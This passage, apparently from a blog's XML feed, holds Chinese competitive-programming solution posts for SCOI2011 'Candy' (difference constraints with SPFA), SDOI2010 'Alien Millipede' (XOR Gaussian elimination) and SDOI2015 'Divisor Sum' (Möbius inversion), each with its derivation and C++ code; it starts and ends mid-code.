MOD) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数学</tag>
        <tag>组合数学</tag>
        <tag>数论</tag>
        <tag>2010</tag>
        <tag>SDOI</tag>
        <tag>Lucas 定理</tag>
      </tags>
  </entry>
  <entry>
    <title>「SCOI2011」糖果 - 差分约束</title>
    <url>/scoi2011-candy/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3275">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2436">LibreOJ 链接</a></p>
<p>幼儿园里有 <span class="math inline">\(N\)</span> 个小朋友，lxhgww
老师现在想要给这些小朋友们分配糖果，要求每个小朋友都要分到糖果。但是小朋友们也有嫉妒心，总是会提出一些要求，比如小明不希望小红分到的糖果比他的多，于是在分配糖果的时候，lxhgww
需要满足小朋友们的 <span class="math inline">\(K\)</span>
个要求。幼儿园的糖果总是有限的，lxhgww
想知道他至少需要准备多少个糖果，才能使得每个小朋友都能够分到糖果，并且满足小朋友们所有的要求。</p>
<span id="more"></span>
<p>要求分为 <span class="math inline">\(5\)</span> 种，每种要求为 <span
class="math inline">\((X, A, B)\)</span>，含义如下：</p>
<ul>
<li><p>如果  <span class="math inline">\(X\)</span> = <span
class="math inline">\(1\)</span>， 表示第  <span
class="math inline">\(A\)</span>  个小朋友分到的糖果必须和第  <span
class="math inline">\(B\)</span>  个小朋友分到的糖果一样多；</p></li>
<li><p>如果  <span class="math inline">\(X\)</span> = <span
class="math inline">\(2\)</span>， 表示第  <span
class="math inline">\(A\)</span>  个小朋友分到的糖果必须少于第  <span
class="math inline">\(B\)</span>  个小朋友分到的糖果；</p></li>
<li><p>如果  <span class="math inline">\(X\)</span> = <span
class="math inline">\(3\)</span>， 表示第  <span
class="math inline">\(A\)</span>  个小朋友分到的糖果必须不少于第  <span
class="math inline">\(B\)</span>  个小朋友分到的糖果；</p></li>
<li><p>如果  <span class="math inline">\(X\)</span> = <span
class="math inline">\(4\)</span>， 表示第  <span
class="math inline">\(A\)</span>  个小朋友分到的糖果必须多于第  <span
class="math inline">\(B\)</span>  个小朋友分到的糖果；</p></li>
<li><p>如果  <span class="math inline">\(X\)</span> = <span
class="math inline">\(5\)</span>， 表示第  <span
class="math inline">\(A\)</span>  个小朋友分到的糖果必须不多于第 <span
class="math inline">\(B\)</span> 个小朋友分到的糖果。</p></li>
</ul>
<h1 id="解题思路">解题思路</h1>
<p>很明显这是一道差分约束的题目。如何转化是本题的重点。</p>
<p>首先我们可以将 <span class="math inline">\(5\)</span>
种情况分别转化。</p>
<p><span class="math display">\[
\begin{cases}
A = B &amp; X = 1 \\
A &lt; B &amp; X = 2 \\
A \geq B &amp; X = 3 \\
A &gt; B &amp; X = 4 \\
A \leq B &amp; X = 5
\end{cases}
\]</span></p>
<p>由于差分约束无法处理大于号和小于号，又同时数据只涉及整数，我们可以做如下处理：</p>
<p><span class="math display">\[
x &lt; y (x, y \in \mathbb{Z}) \Leftrightarrow x + 1 \leq y
\]</span></p>
<p>于是我们可以把 <span class="math inline">\(2\)</span> 和 <span
class="math inline">\(4\)</span> 情况加以转化，最终得出以下不等式：</p>
<p><span class="math display">\[
\begin{cases}
A - B \geq 0 \vee B - A \geq 0 &amp; X = 1 \\
B - A \geq 1 &amp; X = 2 \\
A - B \geq 0 &amp; X = 3 \\
A - B \geq 1 &amp; X = 4 \\
A - B \geq 0 &amp; X = 5
\end{cases}
\]</span></p>
<p>由于不等式中都是大于等于号，我们可以用最长路解决。</p>
<p>不用最短路是因为最短路中出现了负权边，毫无关系的两个点的最短路大小关系会受到
<span class="math inline">\(0\)</span>
的影响，若想得到正确答案则需要在除去超级源点的图的弱连通分量中分别寻找答案，码量巨大，及其难写。若使用最长路则不会出现负权边，不会出现该情况。</p>
<p>最终答案就是最终解的和。若解的最小值不等于 <span
class="math inline">\(1\)</span>
，由于差分性质，可以把所有解同时加一个数或减一个数，使最小值等于 <span
class="math inline">\(1\)</span> 后再求和。</p>
<p>同时要注意特判在 <span class="math inline">\(2\)</span> 和 <span
class="math inline">\(4\)</span> 情况下 <span
class="math inline">\(A\)</span> 和 <span
class="math inline">\(B\)</span> 不能相等，否则无解。</p>
<p>最后注意一下由于这道题的图是稀疏图，且数据较大，所以求最长路只能用
<del>已经死了的</del> SPFA，用 Bellman-Ford 会 TLE。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, k, cnt[MAXN + <span class="number">1</span>];</span><br><span class="line">std::vector&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dis[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">bool</span> vis[MAXN + <span class="number">1</span>];</span><br><span class="line">std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SPFA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">-0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(cnt, <span class="number">0</span>, <span class="built_in">sizeof</span>(cnt));</span><br><span class="line">    dis[<span class="number">0</span>] = <span class="number">0</span>, vis[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        vis[u] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> ed : e[u]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[ed.first] &lt; dis[u] + ed.second) &#123;</span><br><span class="line">                dis[ed.first] = dis[u] + ed.second;</span><br><span class="line">                cnt[ed.first] = cnt[u] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (cnt[ed.first] &gt;= n + <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (!vis[ed.first]) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(ed.first);</span><br><span class="line">                    vis[ed.first] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x, a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">1</span>) &#123;</span><br><span class="line">            e[a].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(b, <span class="number">0</span>) );</span><br><span class="line">            e[b].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(a, <span class="number">0</span>) );</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">                std::cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> e[a].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(b, <span class="number">1</span>) );</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">3</span>) e[b].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(a, <span class="number">0</span>) );</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">                std::cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> e[b].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(a, <span class="number">1</span>) );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> e[a].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(b, <span class="number">0</span>) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) e[<span class="number">0</span>].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(i, <span class="number">0</span>) );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SPFA</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> minn = INF;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (minn &gt; dis[i]) minn = dis[i];</span><br><span class="line">            sum += dis[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sum += (<span class="type">long</span> <span class="type">long</span>)n * (<span class="number">1</span> - minn);</span><br><span class="line">        std::cout &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>差分约束</tag>
        <tag>2011</tag>
        <tag>SCOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「SDOI2010」外星千年虫 - 高斯消元</title>
    <url>/sdoi2010-worm/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2447">洛谷链接</a></p>
<p>研究人员从外星带来了外星千年虫。他们发现，外星千年虫的足并不像地球千足虫成对出现、总共偶数条——它们每节身体下方都有着不定数量的足，但足的总数一定是奇数条！</p>
<p>虽然从外观难以区分二者，但通过统计足的数目，科学家们就能根据奇偶性判断出千足虫所属的星球。</p>
<p>作为 J 国派去 NASA
的秘密间谍，你希望参加这次研究活动以掌握进一步的情报，而 NASA
选拔的研究人员都是最优秀的科学家。于是 NASA 局长 Charles Bolden
出了一道难题来检测你的实力：</p>
<p>现在你面前摆有 <span class="math inline">\(1\ldots N\)</span> 编号的
<span class="math inline">\(N\)</span>
只千足虫，你的任务是鉴定每只虫子所属的星球，但不允许亲自去数它们的足。</p>
<p>Charles 每次会在这 <span class="math inline">\(N\)</span>
只千足虫中选定若干只放入“昆虫点足机”（the Insect Feet Counter,
IFC）中，“点足机”会自动统计出其内所有昆虫足数之和。Charles 会将这个和数
<span class="math inline">\(\bmod\)</span> <span
class="math inline">\(2\)</span>
的结果反馈给你，同时告诉你一开始放入机器中的是哪几只虫子。</p>
<p>他的这种统计操作总共进行 <span class="math inline">\(M\)</span>
次，而你应当尽早得出鉴定结果。</p>
<p>假如在第 <span class="math inline">\(K\)</span>
次统计结束后，现有数据就足以确定每只虫子的身份，你就还应将这个 <span
class="math inline">\(K\)</span> 反馈给 Charles，此时若 <span
class="math inline">\(K&lt;M\)</span>，则表明那后 <span
class="math inline">\(M-K\)</span> 次统计并非必须的。</p>
<p>如果根据所有 <span class="math inline">\(M\)</span>
次统计数据还是无法确定每只虫子身份，你也要跟 Charles
讲明：就目前数据会存在多个解。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>我们假设外星千年虫有 <span class="math inline">\(1\)</span>
个足，地球千年虫有 <span class="math inline">\(0\)</span>
个足，则该题可表示为求下列方程的解（其中 <span
class="math inline">\(\forall x_{i, j}, b_i \in \{ 0, 1
\}\)</span>）：</p>
<p><span class="math display">\[
\begin{cases}
\oplus_{i = 1}^nx_{1, i}a_i = b_1 \\
\oplus_{i = 1}^nx_{2, i}a_i = b_2 \\
\cdots \\
\oplus_{i = 1}^nx_{m, i}a_i = b_m \\
\end{cases}
\]</span></p>
<p>于是我们将这道题转化为异或方程组求解问题。异或可看成不进位的加减法，同样可使用高斯消元求解。本题还需要统计最少使用方程数，我们只需在每次选择在处理
<span class="math inline">\(a_i\)</span> 时选择 <span
class="math inline">\(x_{j, i} = 1\)</span> 且 <span
class="math inline">\(j\)</span> 最小的项交换，并统计所有对应的 <span
class="math inline">\(j\)</span> 的最大值即可。</p>
<p>在高斯消元时可使用 <code>std::bitset</code> 优化代码。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e3</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">2e3</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> s[MAXN + <span class="number">2</span>];</span><br><span class="line">    <span class="type">static</span> std::bitset&lt;MAXN + 1&gt; a[MAXM + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> in;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>, s + <span class="number">1</span>, &amp;in);</span><br><span class="line">        a[i][n + <span class="number">1</span>] = in;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) a[i][j] = s[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> max = n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        max = std::<span class="built_in">max</span>(max, i);</span><br><span class="line">        <span class="keyword">if</span> (!a[i][i]) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a[j][i]) &#123;</span><br><span class="line">                    std::<span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">                    max = std::<span class="built_in">max</span>(max, j);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (a[i][i] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Cannot Determine&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = m; k &gt; i; k--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[k][i]) &#123;</span><br><span class="line">                a[k] ^= a[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i - <span class="number">1</span>; j; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j][i]) &#123;</span><br><span class="line">                a[j] ^= a[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i][n + <span class="number">1</span>]) <span class="built_in">puts</span>(<span class="string">&quot;?y7M#&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Earth&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数学</tag>
        <tag>高斯消元</tag>
        <tag>2010</tag>
        <tag>SDOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「SDIO2015」约数个数和 - 莫比乌斯反演</title>
    <url>/sdoi2015-divisor/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3327">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2185">LibreOJ 链接</a></p>
<p>设 <span class="math inline">\(d(x)\)</span> 为 <span
class="math inline">\(x\)</span> 的约数个数，给定 <span
class="math inline">\(n, m\)</span>，求</p>
<p><span class="math display">\[
\sum_{i = 1}^n\sum_{j = 1}^m d(ij)
\]</span></p>
<p>对于所有的数据，<span class="math inline">\(1 \leq N, M \leq 50000,\
1 \leq T \leq 50000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<h2 id="约数个数的变换">约数个数的变换</h2>
<p>对这个式子，我们首先要解决的是 <span
class="math inline">\(d(ij)\)</span>。对于 <span
class="math inline">\(d(ij)\)</span>，我们有以下结论：</p>
<p><span class="math display">\[
d(ij) = \sum_{x | i}\sum_{y | j}[\gcd(x, y) = 1]
\]</span></p>
<p>证明：我们可以对 <span class="math inline">\(i\)</span>，<span
class="math inline">\(j\)</span> 分解质因数：<span
class="math inline">\(i = \prod{ p_i^{a_i} }\)</span>，<span
class="math inline">\(j = \prod{ p_i^{b_i} }\)</span>，故 <span
class="math inline">\(ij = \prod{ p_i^{c_i = a_i + b_i} }\)</span>。对于
<span class="math inline">\(ij\)</span> 的每个约数中的 <span
class="math inline">\(p_i\)</span>，我们总可以找到一个 <span
class="math inline">\(d_i (d_i \le c_i)\)</span> 进行对应。而对于每个
<span class="math inline">\(d_i\)</span>，我们分为两种情况：</p>
<ol type="1">
<li><span class="math inline">\(d_i &lt;= a_i\)</span>，则 <span
class="math inline">\(p_i\)</span> 全部在 <span
class="math inline">\(i\)</span> 中取；</li>
<li><span class="math inline">\(a_i &lt; d_i \le a_i + b_i\)</span>，则
<span class="math inline">\(p_i\)</span> 在 <span
class="math inline">\(i\)</span> 中取完后再在 <span
class="math inline">\(b_i\)</span> 中补充。</li>
</ol>
<p>我们可以发现，<strong>对于每一种 <span
class="math inline">\(d_i\)</span>，用上述方法我们总可以找到唯一一种用
<span class="math inline">\(a_i\)</span>、<span
class="math inline">\(b_i\)</span> 对应的方法；所以对应每一种 <span
class="math inline">\(ij\)</span>
的约数，用上述方法我们总可以找到对应且为唯一对应。</strong></p>
<p>于是我们可以利用 <span class="math inline">\(i\)</span>、<span
class="math inline">\(j\)</span> 的约数进行统计。令 <span
class="math inline">\(x | i\)</span>，<span class="math inline">\(y |
j\)</span>；当 <span class="math inline">\(\gcd(i, j) = 1\)</span>
时，对于 <span class="math inline">\(p_i\)</span>，<span
class="math inline">\(i\)</span>、<span class="math inline">\(j\)</span>
中仅有一个含有 <span class="math inline">\(p_i\)</span>：</p>
<ul>
<li>当仅有 <span class="math inline">\(x\)</span> 含有 <span
class="math inline">\(p_i\)</span> 时，对应上述方法 <span
class="math inline">\(1\)</span>；</li>
<li>当仅有 <span class="math inline">\(y\)</span> 含有 <span
class="math inline">\(p_i\)</span> 时，其中「<span
class="math inline">\(x\)</span> 不含有 <span
class="math inline">\(p_i\)</span>，<span
class="math inline">\(y\)</span> 含有 <span
class="math inline">\(p_i\)</span>」所含情况数和「<span
class="math inline">\(i\)</span> 中的 <span
class="math inline">\(p_i\)</span> 被取完，<span
class="math inline">\(y\)</span> 含有 <span
class="math inline">\(p_i\)</span>」相同，对于 <span
class="math inline">\(d(ij)\)</span>
只统计个数来说是等价的。所以对应上述方法 <span
class="math inline">\(2\)</span>。</li>
</ul>
<p>综上，我们仅需统计满足 <span class="math inline">\(\gcd(i, j) =
1\)</span> 的 <span class="math inline">\((i, j)\)</span> 的个数即可。即
<span class="math inline">\(d(ij) = \sum_{x | i}\sum_{y | j}[\gcd(x, y)
= 1]\)</span>。</p>
<h2 id="莫比乌斯反演">莫比乌斯反演</h2>
<p>接下来原式就变成了下列形式：</p>
<p><span class="math display">\[
\sum_{i = 1}^n\sum_{j = 1}^m\sum_{x | i}\sum_{y | j}[\gcd(x, y) = 1]
\]</span></p>
<p>我们设 <span class="math inline">\(A(n, m) = \sum_{i = 1}^n \sum_{j =
1}^m\sum_{x | i}\sum_{y | j}[\gcd(x, y) = 1]\)</span>，显然 <span
class="math inline">\(A(n, m)\)</span> 即为答案。</p>
<p>对于 <span class="math inline">\([\gcd(x, y) = 1]\)</span> 其中的
<span class="math inline">\(1\)</span>
不好化简，于是我们可以设下列函数：</p>
<p><span class="math display">\[
\begin{align*}
f(a) &amp;= \sum_{i = 1}^n\sum_{j = 1}^m\sum_{x | i}\sum_{y | j}[\gcd(x,
y) = a] \\
&amp;= \sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x} \rfloor \lfloor
\frac{m}{y} \rfloor [\gcd(x, y) = a]
\end{align*}
\]</span></p>
<p>显然 <span class="math inline">\(A(n, m) =
f(1)\)</span>。接下来我们要化简 <span
class="math inline">\(f(a)\)</span>。我们设下列函数：</p>
<p><span class="math display">\[
\begin{align*}
F(b) &amp;= \sum_{b | a}f(a) \\
&amp;= \sum_{b | a}\sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x}
\rfloor \lfloor \frac{m}{y} \rfloor [\gcd(x, y) = a] \\
&amp;= \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{a} \rfloor \lfloor
\frac{m}{a} \rfloor \} }\sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x}
\rfloor \lfloor \frac{m}{y} \rfloor [\gcd(x, y) = a] \\
&amp;= \sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x} \rfloor \lfloor
\frac{m}{y} \rfloor [b | \gcd(x, y)] \\
&amp;= \sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x} \rfloor \lfloor
\frac{m}{y} \rfloor [b | x][b | y] \\
&amp;= \sum_{x = 1}^n\sum_{y = 1}^m \lfloor \frac{n}{x} \rfloor \lfloor
\frac{m}{y} \rfloor [b | x][b | y] \\
&amp;= \sum_{i = 1}^{ \lfloor\frac{n}{b}\rfloor }\sum_{j = 1}^{
\lfloor\frac{m}{b}\rfloor }
\lfloor\frac{n}{bi}\rfloor\lfloor\frac{m}{bj}\rfloor \\
\end{align*}
\]</span></p>
<p>由于 <span class="math inline">\(F(b) = \sum_{b |
a}f(a)\)</span>，我们可以进行莫比乌斯反演：</p>
<p><span class="math display">\[
f(a) = \sum_{a | b}\mu(\frac{b}{a})F(b)
\]</span></p>
<p>接下来可以带入 <span class="math inline">\(A(n, m)\)</span>：</p>
<p><span class="math display">\[
\begin{align*}
A(n, m) &amp;= f(1) \\
&amp;= \sum_{b}^{ \min\{n, m\} }\mu(b)F(b) \\
&amp;= \sum_{b}^{ \min\{n, m\} }\mu(b)\sum_{i = 1}^{
\lfloor\frac{n}{b}\rfloor }\sum_{j = 1}^{ \lfloor\frac{m}{b}\rfloor }
\lfloor\frac{n}{bi}\rfloor\lfloor\frac{m}{bj}\rfloor \\
&amp;= \sum_{b}^{ \min\{n, m\} }\mu(b)(\sum_{i = 1}^{
\lfloor\frac{n}{b}\rfloor }\lfloor\frac{n}{bi}\rfloor)(\sum_{j = 1}^{
\lfloor\frac{m}{b}\rfloor } \lfloor\frac{m}{bj}\rfloor) \\
&amp;= \sum_{b}^{ \min\{n, m\} }\mu(b)(\sum_{i = 1}^{
\lfloor\frac{n}{b}\rfloor
}\lfloor\frac{\lfloor\frac{n}{b}\rfloor}{i}\rfloor)(\sum_{j = 1}^{
\lfloor\frac{m}{b}\rfloor
}\lfloor\frac{\lfloor\frac{m}{b}\rfloor}{j}\rfloor)
\end{align*}
\]</span></p>
<p>接下来预处理一下 <span class="math inline">\(\mu(n)\)</span>
的前缀和与 <span class="math inline">\(\sum_{i =
1}^n\lfloor\frac{n}{i}\rfloor\)</span> 的前缀和，在询问时用数论分块求
<span class="math inline">\(A(n, m)\)</span> 即可。预处理复杂度 <span
class="math inline">\(O(n\sqrt{n})\)</span>，单次询问复杂度 <span
class="math inline">\(O(\sqrt{n})\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e4</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> isNotPrime[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> mu[MAXN + <span class="number">1</span>], primes[MAXN + <span class="number">1</span>], cnt;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sumMu[MAXN + <span class="number">1</span>], sum[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">getPrimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    isNotPrime[<span class="number">0</span>] = isNotPrime[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isNotPrime[i]) &#123;</span><br><span class="line">            primes[++cnt] = i;</span><br><span class="line">            mu[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt; j++) &#123;</span><br><span class="line">            <span class="type">int</span> t = i * primes[j];</span><br><span class="line">            <span class="keyword">if</span> (t &gt; MAXN) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            isNotPrime[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                mu[t] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> mu[t] = -mu[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sumMu[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) sumMu[i] = sumMu[i - <span class="number">1</span>] + mu[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) 